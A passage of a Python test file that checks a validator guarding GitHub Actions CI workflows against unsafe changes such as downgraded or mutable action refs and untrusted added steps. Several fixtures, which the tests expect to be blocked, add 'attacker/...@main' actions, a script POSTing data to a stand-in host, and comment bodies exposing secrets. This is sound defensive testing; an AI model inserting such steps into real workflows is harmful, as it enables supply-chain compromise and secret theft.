    steps:
      - uses: actions/checkout@v4
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.actions/checkout@v4.uses"
    assert "workflow action changed outside pinned ref bump" in violation.reason


@pytest.mark.unit
def test_workflow_pinned_uses_sha_to_full_semver_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.2.0
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_bump_allows_action_case_change() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: Actions/Checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.2.0
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_version_downgrade_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v4.2.0
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v3.0.0
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.actions/setup-python@v3.0.0.uses"
    assert "workflow action changed outside pinned ref bump" in violation.reason


@pytest.mark.parametrize(
    ("old_ref", "new_ref"),
    [
        ("v1.0.0-rc.10", "v1.0.0-rc.2"),
        ("v1.0.0-rc2", "v1.0.0-rc10"),
        ("v1.0.0-rc10", "v1.0.0-rc2"),
    ],
)
@pytest.mark.unit
def test_workflow_pinned_uses_prerelease_downgrade_is_blocked(old_ref: str, new_ref: str) -> None:
    old_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@{old_ref}
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@{new_ref}
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == f"jobs.tests.steps.actions/setup-python@{new_ref}.uses"
    assert "workflow action changed outside pinned ref bump" in violation.reason


@pytest.mark.unit
def test_workflow_pinned_uses_version_upgrade_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v3.1.0
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v4.2.0
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.parametrize(
    ("old_ref", "new_ref"),
    [
        ("v1.0.0-rc1", "v1.0.0-rc2"),
        ("v1.0.0-beta2", "v1.0.0-beta3"),
        ("v1.0.0-alpha3", "v1.0.0-alpha4"),
    ],
)
@pytest.mark.unit
def test_workflow_pinned_uses_simple_prerelease_bump_is_allowed(
    old_ref: str,
    new_ref: str,
) -> None:
    old_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@{old_ref}
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@{new_ref}
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_version_bump_allows_with_input_update() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v4.7.0
        with:
          python-version: "3.11"
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v5.0.0
        with:
          python-version: "3.12"
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_version_bump_allows_unchanged_sensitive_with_input() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v4.7.0
        with:
          python-version: "3.11"
          token: ${{ secrets.GITHUB_TOKEN }}
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v5.0.0
        with:
          python-version: "3.12"
          token: ${{ secrets.GITHUB_TOKEN }}
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_version_bump_blocks_github_script_input_rewrite() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v6.4.0
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: "Validation complete",
            });
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7.0.0
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: "Validation complete for " + context.sha,
            });
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post PR comment.with"
    assert "workflow action with inputs changed during pinned ref bump" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "with_inputs",
    [
        "          token: ${{ secrets.DEPLOY_KEY }}",
        "          token: custom-token",
        "          path: ${{ secrets.DEPLOY_PATH }}",
    ],
)
def test_workflow_pinned_uses_version_bump_blocks_sensitive_with_input(
    with_inputs: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
{with_inputs}
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.actions/checkout@v4.with"
    assert "workflow action with inputs changed during pinned ref bump" in violation.reason


@pytest.mark.unit
def test_workflow_uses_bump_to_mutable_branch_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.actions/checkout@main.uses"
    assert "workflow action changed outside pinned ref bump" in violation.reason


@pytest.mark.unit
def test_added_informational_step_with_uses_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Notify reviewers
        uses: attacker/action@main
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Notify reviewers"
    assert violation.line == 9
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_informational_step_with_untrusted_notify_uses_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - uses: attacker/notify@main
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.attacker/notify@main"
    assert violation.line == 9
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_github_script_comment_step_without_script_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post PR comment
        uses: actions/github-script@v7
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post PR comment"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_github_script_step_with_comment_script_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post PR comment
        uses: actions/github-script@v7
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: `Validation complete for ${context.sha}`,
            });
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_added_github_script_step_with_comment_script_and_safe_options_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post PR comment
        uses: actions/github-script@v7
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: `Validation complete for ${context.sha}`,
            });
          debug: true
          result-encoding: string
          retries: 3
          retry-exempt-status-codes: 400,401
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
@pytest.mark.parametrize(
    "with_body",
    [
        """
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: "done",
            });
""",
        """
        with:
          script: |
            const content = await github.rest.repos.getContent({
              owner: context.repo.owner,
              repo: context.repo.repo,
              path: "README.md",
            });
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: String(content.data),
            });
""",
        """
        with:
          script: |
            await fetch("https://example.invalid/notify", {
              method: "POST",
              body: context.sha,
            });
""",
    ],
)
def test_added_github_script_step_with_script_unsafe_inputs_are_blocked(
    with_body: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post PR comment
        uses: actions/github-script@v7
{with_body.rstrip()}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post PR comment"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_github_script_step_without_comment_label_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - uses: actions/github-script@v7
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.actions/github-script@v7"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_github_script_step_with_script_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post PR comment
        uses: actions/github-script@v7
        with:
          script: |
            await exec.exec("uv", ["run", "pytest"]);
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post PR comment"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_comment_action_step_with_body_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post PR comment
        uses: peter-evans/create-or-update-comment@v4
        with:
          body: Tests completed
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_added_comment_action_step_with_safe_body_expression_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post PR comment
        uses: peter-evans/create-or-update-comment@v4
        with:
          body: Tests passed on ${{ github.sha }} for PR ${{ github.event.pull_request.number }}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_added_comment_action_step_with_reactions_edit_mode_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post PR comment
        uses: peter-evans/create-or-update-comment@v4
        with:
          body: Tests completed
          reactions: rocket
          reactions-edit-mode: replace
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
@pytest.mark.parametrize(
    "with_inputs",
    [
        "          body: ${{ secrets.AWF_TOKEN }}",
        "          body: ${{ env.API_KEY }}",
        "          body: ${{ env.CI_SUMMARY }}",
        "          body: ${{ steps.test.outputs.result }}",
        "          body: ${{ needs.validation.outputs.summary }}",
        "          body: ${{ github.event.pull_request.title }}",
    ],
)
def test_added_comment_action_step_blocks_unsafe_with_expression(
    with_inputs: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post PR comment
        uses: peter-evans/create-or-update-comment@v4
        with:
{with_inputs}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post PR comment"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "with_inputs",
    [
        "          token: custom-token\n          body: Tests completed",
        "          repository: other/repo\n          body: Tests completed",
        "          body-path: ./coverage.xml",
    ],
)
def test_added_comment_action_step_blocks_privileged_with_key(
    with_inputs: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post PR comment
        uses: peter-evans/create-or-update-comment@v4
        with:
{with_inputs}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post PR comment"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_informational_job_with_comment_action_uses_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  notify-comment:
    name: Notify reviewers
    runs-on: ubuntu-latest
    steps:
      - uses: peter-evans/create-or-update-comment@v4
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_added_informational_job_with_needs_if_and_comment_permissions_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  notify-comment:
    name: Notify reviewers
    needs: [tests]
    if: ${{ always() }}
    permissions:
      pull-requests: write
    runs-on: ubuntu-latest
    steps:
      - uses: peter-evans/create-or-update-comment@v4
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
@pytest.mark.parametrize(
    "permissions",
    [
        "permissions: {}",
        "permissions: read-all",
        "permissions:\n      contents: read",
    ],
)
def test_added_informational_job_with_restricted_permissions_is_allowed(
    permissions: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  summary:
    name: Summary report
    runs-on: ubuntu-latest
    {permissions}
    steps:
      - name: Summary report
        run: echo "heads up"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_added_informational_job_with_untrusted_notify_uses_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  notify:
    name: Notify reviewers
    runs-on: ubuntu-latest
    steps:
      - uses: attacker/notify@main
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.notify"
    assert violation.line == 9
    assert "added workflow jobs must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_informational_job_with_uses_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  notify:
    name: Notify reviewers
    runs-on: ubuntu-latest
    steps:
      - name: Notify reviewers
        uses: attacker/action@main
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.notify"
    assert violation.line == 9
    assert "added workflow jobs must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_informational_reusable_workflow_job_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  notify-comment:
    name: Notify reviewers
    uses: org/reusable-notify/.github/workflows/comment.yml@v1
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.notify-comment"
    assert violation.line == 9
    assert "added workflow jobs must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    ("old_header", "new_header", "section", "line", "reason"),
    [
        (
            "name: CI\non: [pull_request]",
            "name: CI\non: [push, pull_request]",
            "workflow.on",
            2,
            "workflow top-level field changed outside allowed cases: on",
        ),
        (
            "name: CI\non: [pull_request]\npermissions:\n  contents: read",
            (
                "name: CI\non: [pull_request]\npermissions:\n"
                "  contents: read\n  pull-requests: write"
            ),
            "workflow.permissions",
            3,
            "workflow top-level field changed outside allowed cases: permissions",
        ),
    ],
)
def test_workflow_top_level_field_change_is_blocked(
    old_header: str,
    new_header: str,
    section: str,
    line: int,
    reason: str,
) -> None:
    old_text = f"""
